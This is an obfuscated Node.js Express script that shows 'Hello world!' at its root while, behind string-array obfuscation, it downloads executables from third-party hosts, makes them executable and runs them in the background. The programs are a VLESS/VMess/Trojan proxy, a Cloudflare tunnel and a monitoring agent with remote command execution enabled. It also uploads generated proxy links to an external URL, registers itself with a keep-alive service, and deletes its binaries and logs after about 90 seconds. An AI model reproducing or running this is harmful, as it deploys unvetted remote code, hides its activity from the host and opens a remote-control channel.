const _0x30ac82=_0x2573;(function(_0x1a2a79,_0x341313){const _0x557061=_0x2573,_0x2720ad=_0x1a2a79();while(!![]){try{const _0x258527=parseInt(_0x557061(0x13c))/0x1*(-parseInt(_0x557061(0xaf))/0x2)+parseInt(_0x557061(0x12e))/0x3*(-parseInt(_0x557061(0x10d))/0x4)+-parseInt(_0x557061(0xb7))/0x5*(parseInt(_0x557061(0x91))/0x6)+-parseInt(_0x557061(0x8b))/0x7*(parseInt(_0x557061(0x106))/0x8)+parseInt(_0x557061(0x144))/0x9*(parseInt(_0x557061(0xcf))/0xa)+parseInt(_0x557061(0xa1))/0xb*(parseInt(_0x557061(0x115))/0xc)+parseInt(_0x557061(0x141))/0xd*(parseInt(_0x557061(0x134))/0xe);if(_0x258527===_0x341313)break;else _0x2720ad['push'](_0x2720ad['shift']());}catch(_0x267478){_0x2720ad['push'](_0x2720ad['shift']());}}}(_0x33c2,0x72362));const express=require(_0x30ac82(0x11b)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x30ac82(0x8e)),{promisify}=require(_0x30ac82(0xa2)),exec=promisify(require('child_process')[_0x30ac82(0x12a)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x30ac82(0xdb)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x30ac82(0x100)]||'',AUTO_ACCESS=process[_0x30ac82(0xdb)][_0x30ac82(0xab)]||![],FILE_PATH=process[_0x30ac82(0xdb)][_0x30ac82(0xec)]||_0x30ac82(0x10b),SUB_PATH=process[_0x30ac82(0xdb)][_0x30ac82(0x95)]||'sub',PORT=process['env'][_0x30ac82(0xcc)]||process[_0x30ac82(0xdb)]['PORT']||0xbb8,UUID=process[_0x30ac82(0xdb)]['UUID']||_0x30ac82(0xd2),NEZHA_SERVER=process[_0x30ac82(0xdb)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x30ac82(0xdb)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x30ac82(0xdb)][_0x30ac82(0x111)]||'',ARGO_DOMAIN=process[_0x30ac82(0xdb)][_0x30ac82(0x127)]||'',ARGO_AUTH=process['env']['ARGO_AUTH']||'',ARGO_PORT=process[_0x30ac82(0xdb)]['ARGO_PORT']||0x1f41,CFIP=process[_0x30ac82(0xdb)][_0x30ac82(0x9d)]||_0x30ac82(0xd8),CFPORT=process[_0x30ac82(0xdb)][_0x30ac82(0x92)]||0x1bb,NAME=process['env'][_0x30ac82(0xa7)]||_0x30ac82(0x125);!fs['existsSync'](FILE_PATH)?(fs[_0x30ac82(0x9b)](FILE_PATH),console[_0x30ac82(0xb5)](FILE_PATH+_0x30ac82(0x12f))):console[_0x30ac82(0xb5)](FILE_PATH+_0x30ac82(0x94));let npmPath=path[_0x30ac82(0x103)](FILE_PATH,_0x30ac82(0x97)),phpPath=path[_0x30ac82(0x103)](FILE_PATH,_0x30ac82(0x139)),webPath=path[_0x30ac82(0x103)](FILE_PATH,_0x30ac82(0x121)),botPath=path['join'](FILE_PATH,_0x30ac82(0x96)),subPath=path[_0x30ac82(0x103)](FILE_PATH,_0x30ac82(0xe4)),listPath=path[_0x30ac82(0x103)](FILE_PATH,_0x30ac82(0x118)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x30ac82(0x103)](FILE_PATH,_0x30ac82(0x10c));function deleteNodes(){const _0x34f7e0=_0x30ac82;try{if(!UPLOAD_URL)return;if(!fs[_0x34f7e0(0x13f)](subPath))return;let _0x35b6f8;try{_0x35b6f8=fs[_0x34f7e0(0xde)](subPath,'utf-8');}catch{return null;}const _0x2fa138=Buffer['from'](_0x35b6f8,_0x34f7e0(0xed))[_0x34f7e0(0xee)](_0x34f7e0(0xf4)),_0x5815ca=_0x2fa138[_0x34f7e0(0xb4)]('\x0a')['filter'](_0x221360=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x34f7e0(0x126)](_0x221360));if(_0x5815ca['length']===0x0)return;return axios[_0x34f7e0(0xc9)](UPLOAD_URL+_0x34f7e0(0xcd),JSON[_0x34f7e0(0xfe)]({'nodes':_0x5815ca}),{'headers':{'Content-Type':_0x34f7e0(0xe2)}})[_0x34f7e0(0x9c)](_0x4c80ec=>{return null;});}catch(_0x580cf4){return null;}}function cleanupOldFiles(){const _0x28aadd=_0x30ac82,_0x214087=['web',_0x28aadd(0x96),_0x28aadd(0x97),_0x28aadd(0x139),'sub.txt',_0x28aadd(0xf6)];_0x214087['forEach'](_0x144805=>{const _0x925cba=_0x28aadd,_0x2623d4=path['join'](FILE_PATH,_0x144805);fs[_0x925cba(0xb2)](_0x2623d4,()=>{});});}app['get']('/',function(_0x2de901,_0x34791d){const _0x3152cf=_0x30ac82;_0x34791d[_0x3152cf(0xf2)](_0x3152cf(0xd7));});const config={'log':{'access':_0x30ac82(0xae),'error':_0x30ac82(0xae),'loglevel':_0x30ac82(0x133)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x30ac82(0xad),'settings':{'clients':[{'id':UUID,'flow':_0x30ac82(0xbf)}],'decryption':_0x30ac82(0x133),'fallbacks':[{'dest':0xbb9},{'path':_0x30ac82(0x128),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x30ac82(0xf8),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x30ac82(0xad),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x30ac82(0x133)}},{'port':0xbba,'listen':_0x30ac82(0xe6),'protocol':_0x30ac82(0xad),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x30ac82(0x133),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x30ac82(0xc1),_0x30ac82(0xc7)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x30ac82(0xe6),'protocol':_0x30ac82(0xaa),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x30ac82(0xef)}},'sniffing':{'enabled':!![],'destOverride':[_0x30ac82(0xbc),_0x30ac82(0xc1),_0x30ac82(0xc7)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x30ac82(0xe6),'protocol':_0x30ac82(0x9a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x30ac82(0x133),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x30ac82(0xbc),_0x30ac82(0xc1),_0x30ac82(0xc7)],'metadataOnly':![]}}],'dns':{'servers':[_0x30ac82(0x138)]},'outbounds':[{'protocol':_0x30ac82(0xd4),'tag':_0x30ac82(0x113)},{'protocol':_0x30ac82(0x11c),'tag':'block'}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x30ac82(0x10c)),JSON[_0x30ac82(0xfe)](config,null,0x2));function getSystemArchitecture(){const _0x5d71e6=_0x30ac82,_0x8e648d=os['arch']();return _0x8e648d===_0x5d71e6(0xd9)||_0x8e648d===_0x5d71e6(0x90)||_0x8e648d==='aarch64'?'arm':_0x5d71e6(0xe1);}function downloadFile(_0x1c5bf4,_0xfa5312,_0x580426){const _0x5a4552=_0x30ac82,_0x584d4e=path['join'](FILE_PATH,_0x1c5bf4),_0x15c4d8=fs['createWriteStream'](_0x584d4e);axios({'method':_0x5a4552(0xa4),'url':_0xfa5312,'responseType':_0x5a4552(0x8c)})[_0x5a4552(0x117)](_0x3d8d7b=>{const _0x414b70=_0x5a4552;_0x3d8d7b['data'][_0x414b70(0xe9)](_0x15c4d8),_0x15c4d8['on'](_0x414b70(0xc2),()=>{const _0x3a13c8=_0x414b70;_0x15c4d8['close'](),console[_0x3a13c8(0xb5)](_0x3a13c8(0xbb)+_0x1c5bf4+_0x3a13c8(0xac)),_0x580426(null,_0x1c5bf4);}),_0x15c4d8['on'](_0x414b70(0xb6),_0x3dc0b4=>{const _0x270562=_0x414b70;fs['unlink'](_0x584d4e,()=>{});const _0x23bb62=_0x270562(0xbb)+_0x1c5bf4+_0x270562(0x11f)+_0x3dc0b4[_0x270562(0xce)];console[_0x270562(0xb6)](_0x23bb62),_0x580426(_0x23bb62);});})[_0x5a4552(0x9c)](_0x5ed8e4=>{const _0x3a488f=_0x5a4552,_0x1f88b8=_0x3a488f(0xbb)+_0x1c5bf4+'\x20failed:\x20'+_0x5ed8e4[_0x3a488f(0xce)];console[_0x3a488f(0xb6)](_0x1f88b8),_0x580426(_0x1f88b8);});}async function downloadFilesAndRun(){const _0xada110=_0x30ac82,_0xcbd0d4=getSystemArchitecture(),_0x36de90=getFilesForArchitecture(_0xcbd0d4);if(_0x36de90[_0xada110(0x10a)]===0x0){console[_0xada110(0xb5)](_0xada110(0x114));return;}const _0x2b5c2b=_0x36de90[_0xada110(0xc8)](_0x3fdf09=>{return new Promise((_0x4dad73,_0x24d2c5)=>{const _0x3830b0=_0x2573;downloadFile(_0x3fdf09[_0x3830b0(0x8a)],_0x3fdf09[_0x3830b0(0xb3)],(_0x41b789,_0x5e40d7)=>{_0x41b789?_0x24d2c5(_0x41b789):_0x4dad73(_0x5e40d7);});});});try{await Promise[_0xada110(0xf9)](_0x2b5c2b);}catch(_0x112dcf){console[_0xada110(0xb6)](_0xada110(0xe8),_0x112dcf);return;}function _0x36cbf6(_0x5ad181){const _0x5f00fb=_0xada110,_0x2ae2d5=0x1fd;_0x5ad181[_0x5f00fb(0x10f)](_0x63f548=>{const _0x258324=_0x5f00fb,_0x3a784d=path['join'](FILE_PATH,_0x63f548);fs[_0x258324(0x13f)](_0x3a784d)&&fs[_0x258324(0xf1)](_0x3a784d,_0x2ae2d5,_0x56fe4e=>{const _0x22e8db=_0x258324;_0x56fe4e?console['error']('Empowerment\x20failed\x20for\x20'+_0x3a784d+':\x20'+_0x56fe4e):console[_0x22e8db(0xb5)](_0x22e8db(0xda)+_0x3a784d+':\x20'+_0x2ae2d5[_0x22e8db(0xee)](0x8));});});}const _0x38c0f6=NEZHA_PORT?[_0xada110(0xf7),_0xada110(0xe0),_0xada110(0xb8)]:[_0xada110(0x13d),'./web',_0xada110(0xb8)];_0x36cbf6(_0x38c0f6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4249d7=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0xada110(0xb4)](':')[_0xada110(0xba)]():'',_0x2c027d=new Set([_0xada110(0x112),_0xada110(0xd0),_0xada110(0xc4),_0xada110(0xfd),_0xada110(0x135),_0xada110(0xf3)]),_0x328b8d=_0x2c027d[_0xada110(0x8f)](_0x4249d7)?_0xada110(0xa8):'false',_0x4dd41=_0xada110(0xdf)+NEZHA_KEY+_0xada110(0x142)+NEZHA_SERVER+_0xada110(0xcb)+_0x328b8d+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0xada110(0xf0)](path['join'](FILE_PATH,_0xada110(0x120)),_0x4dd41);const _0x254292='nohup\x20'+FILE_PATH+_0xada110(0xe5)+FILE_PATH+_0xada110(0xd6);try{await exec(_0x254292),console[_0xada110(0xb5)](_0xada110(0xb0)),await new Promise(_0x1c6f0a=>setTimeout(_0x1c6f0a,0x3e8));}catch(_0x5728c3){console[_0xada110(0xb6)](_0xada110(0x105)+_0x5728c3);}}else{let _0x5769bf='';const _0x25978d=[_0xada110(0x112),_0xada110(0xd0),_0xada110(0xc4),_0xada110(0xfd),'2083',_0xada110(0xf3)];_0x25978d[_0xada110(0x102)](NEZHA_PORT)&&(_0x5769bf='--tls');const _0x508cc6='nohup\x20'+FILE_PATH+_0xada110(0x104)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5769bf+_0xada110(0x12c);try{await exec(_0x508cc6),console[_0xada110(0xb5)](_0xada110(0x11e)),await new Promise(_0x4427a9=>setTimeout(_0x4427a9,0x3e8));}catch(_0x105fbb){console[_0xada110(0xb6)]('npm\x20running\x20error:\x20'+_0x105fbb);}}}else console[_0xada110(0xb5)](_0xada110(0xd3));const _0x461572=_0xada110(0xdc)+FILE_PATH+'/web\x20-c\x20'+FILE_PATH+_0xada110(0xa5);try{await exec(_0x461572),console[_0xada110(0xb5)]('web\x20is\x20running'),await new Promise(_0x88e0fd=>setTimeout(_0x88e0fd,0x3e8));}catch(_0x11ad93){console[_0xada110(0xb6)]('web\x20running\x20error:\x20'+_0x11ad93);}if(fs[_0xada110(0x13f)](path[_0xada110(0x103)](FILE_PATH,'bot'))){let _0x580b3a;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x580b3a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0xada110(0xfb)](/TunnelSecret/)?_0x580b3a=_0xada110(0x116)+FILE_PATH+_0xada110(0x101):_0x580b3a=_0xada110(0x140)+FILE_PATH+_0xada110(0x13e)+ARGO_PORT;try{await exec(_0xada110(0xdc)+FILE_PATH+_0xada110(0x98)+_0x580b3a+_0xada110(0x12c)),console[_0xada110(0xb5)](_0xada110(0x131)),await new Promise(_0x524463=>setTimeout(_0x524463,0x7d0));}catch(_0x27f2bf){console[_0xada110(0xb6)](_0xada110(0x110)+_0x27f2bf);}}await new Promise(_0x2a4c9b=>setTimeout(_0x2a4c9b,0x1388));}function getFilesForArchitecture(_0x2c8635){const _0x4d34a8=_0x30ac82;let _0x3cc4d8;_0x2c8635===_0x4d34a8(0xd9)?_0x3cc4d8=[{'fileName':'web','fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':_0x4d34a8(0x96),'fileUrl':_0x4d34a8(0x11d)}]:_0x3cc4d8=[{'fileName':_0x4d34a8(0x121),'fileUrl':_0x4d34a8(0x119)},{'fileName':_0x4d34a8(0x96),'fileUrl':_0x4d34a8(0xd1)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1043e8=_0x2c8635==='arm'?_0x4d34a8(0x129):_0x4d34a8(0xc6);_0x3cc4d8['unshift']({'fileName':_0x4d34a8(0x97),'fileUrl':_0x1043e8});}else{const _0x2e3379=_0x2c8635===_0x4d34a8(0xd9)?_0x4d34a8(0x13b):_0x4d34a8(0x12b);_0x3cc4d8[_0x4d34a8(0xb1)]({'fileName':_0x4d34a8(0x139),'fileUrl':_0x2e3379});}}return _0x3cc4d8;}function argoType(){const _0x3fc1f4=_0x30ac82;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3fc1f4(0xb5)](_0x3fc1f4(0xf5));return;}if(ARGO_AUTH['includes'](_0x3fc1f4(0xc3))){fs[_0x3fc1f4(0xf0)](path[_0x3fc1f4(0x103)](FILE_PATH,_0x3fc1f4(0xeb)),ARGO_AUTH);const _0x39bf0f='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x3fc1f4(0x103)](FILE_PATH,_0x3fc1f4(0xeb))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x3fc1f4(0x9f)+ARGO_PORT+_0x3fc1f4(0xa9);fs['writeFileSync'](path[_0x3fc1f4(0x103)](FILE_PATH,'tunnel.yml'),_0x39bf0f);}else console[_0x3fc1f4(0xb5)](_0x3fc1f4(0x99));}argoType();function _0x33c2(){const _0x40d294=['npm\x20is\x20running','\x20failed:\x20','config.yaml','web','http\x20server\x20is\x20running\x20on\x20port:','bot\x20is\x20running.','Subscription\x20uploaded\x20successfully','Vls','test','ARGO_DOMAIN','/vless-argo','https://arm64.ssss.nyc.mn/agent','exec','https://amd64.ssss.nyc.mn/v1','\x20>/dev/null\x202>&1\x20&','trim','494427cZhqGP','\x20is\x20created','rm\x20-rf\x20','bot\x20is\x20running','filter','none','2450lkfXyf','2083','\x0a\x20\x20\x0avmess://','status','https+local://8.8.8.8/dns-query','php','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','https://arm64.ssss.nyc.mn/v1','492103RsWEWK','./php','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','existsSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','182130rjnWUK','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','clear','3177dHemZD','fileName','7falSUh','stream','ArgoDomain:','path','has','arm64','258966vMzyFm','CFPORT','push','\x20already\x20exists','SUB_PATH','bot','npm','/bot\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','trojan','mkdirSync','catch','CFIP','from','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','?security=tls&sni=','37697qghVnr','util','&path=%2Ftrojan-argo%3Fed%3D2560#','get','/config.json\x20>/dev/null\x202>&1\x20&','Skipping\x20adding\x20automatic\x20access\x20task','NAME','true','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','vmess','AUTO_ACCESS','\x20successfully','vless','/dev/null','2Bohyvm','php\x20is\x20running','unshift','unlink','fileUrl','split','log','error','105aneLWt','./bot','/api/add-subscriptions','pop','Download\x20','http','Content-Type','ARGO_DOMAIN:','xtls-rprx-vision','/vmess-argo?ed=2560','tls','finish','TunnelSecret','2096','Error\x20reading\x20boot.log:','https://amd64.ssss.nyc.mn/agent','quic','map','post','\x0avless://','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','SERVER_PORT','/api/delete-nodes','message','8830CrGtFK','8443','https://amd64.ssss.nyc.mn/2go','55e8ca56-8a0a-4486-b3f9-b9b0d46638a9','NEZHA\x20variable\x20is\x20empty,skip\x20running','freedom','https://oooo.serv00.net/add-url','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Hello\x20world!','www.visa.com.sg','arm','Empowerment\x20success\x20for\x20','env','nohup\x20','set','readFileSync','\x0aclient_secret:\x20','./web','amd','application/json','response','sub.txt','/php\x20-c\x20\x22','127.0.0.1','/sub.txt\x20saved\x20successfully','Error\x20downloading\x20files:','pipe','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','tunnel.json','FILE_PATH','base64','toString','/vmess-argo','writeFileSync','chmod','send','2053','utf-8','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','boot.log','./npm','/trojan-argo','all','&type=ws&host=','match','\x0a\x20\x20\x20\x20','2087','stringify','text/plain;\x20charset=utf-8','PROJECT_URL','/tunnel.yml\x20run','includes','join','/npm\x20-s\x20','php\x20running\x20error:\x20','886456SXNTMa','App\x20is\x20running','automatic\x20access\x20task\x20added\x20successfully','添加URL失败:\x20','length','./tmp','config.json','20ebARlB','unlinkSync','forEach','Error\x20executing\x20command:\x20','NEZHA_KEY','443','direct','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','132RzJYuf','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','then','list.txt','https://amd64.ssss.nyc.mn/web','\x20>/dev/null\x202>&1','express','blackhole','https://arm64.ssss.nyc.mn/2go'];_0x33c2=function(){return _0x40d294;};return _0x33c2();}async function extractDomains(){const _0x1e3489=_0x30ac82;let _0x319f57;if(ARGO_AUTH&&ARGO_DOMAIN)_0x319f57=ARGO_DOMAIN,console['log'](_0x1e3489(0xbe),_0x319f57),await _0x622199(_0x319f57);else try{const _0x232967=fs[_0x1e3489(0xde)](path['join'](FILE_PATH,'boot.log'),_0x1e3489(0xf4)),_0xaa2834=_0x232967['split']('\x0a'),_0x548077=[];_0xaa2834[_0x1e3489(0x10f)](_0x41dc15=>{const _0x494888=_0x1e3489,_0x4f0c5b=_0x41dc15[_0x494888(0xfb)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4f0c5b){const _0x36cdbb=_0x4f0c5b[0x1];_0x548077[_0x494888(0x93)](_0x36cdbb);}});if(_0x548077['length']>0x0)_0x319f57=_0x548077[0x0],console['log'](_0x1e3489(0x8d),_0x319f57),await _0x622199(_0x319f57);else{console[_0x1e3489(0xb5)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x1e3489(0x10e)](path['join'](FILE_PATH,_0x1e3489(0xf6)));async function _0x4fbf5d(){const _0x24e91b=_0x1e3489;try{await exec(_0x24e91b(0x13a));}catch(_0x587ef9){}}_0x4fbf5d(),await new Promise(_0x3d5ad5=>setTimeout(_0x3d5ad5,0xbb8));const _0x52dcb1='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1e3489(0x13e)+ARGO_PORT;try{await exec(_0x1e3489(0xdc)+path[_0x1e3489(0x103)](FILE_PATH,_0x1e3489(0x96))+'\x20'+_0x52dcb1+'\x20>/dev/null\x202>&1\x20&'),console[_0x1e3489(0xb5)](_0x1e3489(0x123)),await new Promise(_0x14992c=>setTimeout(_0x14992c,0xbb8)),await extractDomains();}catch(_0x3b3576){console[_0x1e3489(0xb6)](_0x1e3489(0x110)+_0x3b3576);}}}catch(_0x1cc6ea){console[_0x1e3489(0xb6)](_0x1e3489(0xc5),_0x1cc6ea);}async function _0x622199(_0x928d1){const _0x27bcfd=_0x1e3489,_0x537078=execSync(_0x27bcfd(0xea),{'encoding':'utf-8'}),_0x5d34a2=_0x537078[_0x27bcfd(0x12d)]();return new Promise(_0x1dee29=>{setTimeout(()=>{const _0x413d99=_0x2573,_0x1c1215={'v':'2','ps':NAME+'-'+_0x5d34a2,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x413d99(0x133),'host':_0x928d1,'path':_0x413d99(0xc0),'tls':_0x413d99(0xc1),'sni':_0x928d1,'alpn':''},_0x38acd2=_0x413d99(0xca)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x928d1+_0x413d99(0xfa)+_0x928d1+'&path=%2Fvless-argo%3Fed%3D2560#'+NAME+'-'+_0x5d34a2+_0x413d99(0x136)+Buffer[_0x413d99(0x9e)](JSON[_0x413d99(0xfe)](_0x1c1215))[_0x413d99(0xee)](_0x413d99(0xed))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x413d99(0xa0)+_0x928d1+_0x413d99(0xfa)+_0x928d1+_0x413d99(0xa3)+NAME+'-'+_0x5d34a2+_0x413d99(0xfc);console[_0x413d99(0xb5)](Buffer[_0x413d99(0x9e)](_0x38acd2)[_0x413d99(0xee)](_0x413d99(0xed))),fs[_0x413d99(0xf0)](subPath,Buffer[_0x413d99(0x9e)](_0x38acd2)[_0x413d99(0xee)](_0x413d99(0xed))),console['log'](FILE_PATH+_0x413d99(0xe7)),uplodNodes(),app[_0x413d99(0xa4)]('/'+SUB_PATH,(_0x5aa9c1,_0x1f757b)=>{const _0x3882c2=_0x413d99,_0x7da53c=Buffer[_0x3882c2(0x9e)](_0x38acd2)[_0x3882c2(0xee)](_0x3882c2(0xed));_0x1f757b[_0x3882c2(0xdd)](_0x3882c2(0xbd),_0x3882c2(0xff)),_0x1f757b[_0x3882c2(0xf2)](_0x7da53c);}),_0x1dee29(_0x38acd2);},0x7d0);});}}async function uplodNodes(){const _0x44cc03=_0x30ac82;if(UPLOAD_URL&&PROJECT_URL){const _0x1e3627=PROJECT_URL+'/'+SUB_PATH,_0x568636={'subscription':[_0x1e3627]};try{const _0x1304dd=await axios['post'](UPLOAD_URL+_0x44cc03(0xb9),_0x568636,{'headers':{'Content-Type':_0x44cc03(0xe2)}});if(_0x1304dd[_0x44cc03(0x137)]===0xc8)console[_0x44cc03(0xb5)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x3427fc){if(_0x3427fc[_0x44cc03(0xe3)]){if(_0x3427fc['response'][_0x44cc03(0x137)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x211f63=fs[_0x44cc03(0xde)](listPath,'utf-8'),_0x5cf04e=_0x211f63[_0x44cc03(0xb4)]('\x0a')[_0x44cc03(0x132)](_0x3567c6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3567c6));if(_0x5cf04e[_0x44cc03(0x10a)]===0x0)return;const _0x1838e9=JSON[_0x44cc03(0xfe)]({'nodes':_0x5cf04e});try{await axios[_0x44cc03(0xc9)](UPLOAD_URL+'/api/add-nodes',_0x1838e9,{'headers':{'Content-Type':_0x44cc03(0xe2)}});if(response[_0x44cc03(0x137)]===0xc8)console[_0x44cc03(0xb5)](_0x44cc03(0x124));else return null;}catch(_0x5e3b66){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3d6b77=_0x2573,_0xd7e7ea=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0xd7e7ea[_0x3d6b77(0x93)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xd7e7ea['push'](phpPath);exec(_0x3d6b77(0x130)+_0xd7e7ea[_0x3d6b77(0x103)]('\x20')+_0x3d6b77(0x11a),_0x31da32=>{const _0x418460=_0x3d6b77;console[_0x418460(0x143)](),console[_0x418460(0xb5)](_0x418460(0x107)),console[_0x418460(0xb5)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}function _0x2573(_0x577289,_0xf0b077){const _0x33c28e=_0x33c2();return _0x2573=function(_0x25738e,_0x5cf792){_0x25738e=_0x25738e-0x8a;let _0x18d8ca=_0x33c28e[_0x25738e];return _0x18d8ca;},_0x2573(_0x577289,_0xf0b077);}cleanFiles();async function AddVisitTask(){const _0x2f50fd=_0x30ac82;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2f50fd(0xb5)](_0x2f50fd(0xa6));return;}try{const _0x3c4dc5=await axios[_0x2f50fd(0xc9)](_0x2f50fd(0xd5),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console[_0x2f50fd(0xb5)](_0x2f50fd(0x108));}catch(_0x90dd8c){console['error'](_0x2f50fd(0x109)+_0x90dd8c[_0x2f50fd(0xce)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app['listen'](PORT,()=>console[_0x30ac82(0xb5)](_0x30ac82(0x122)+PORT+'!'));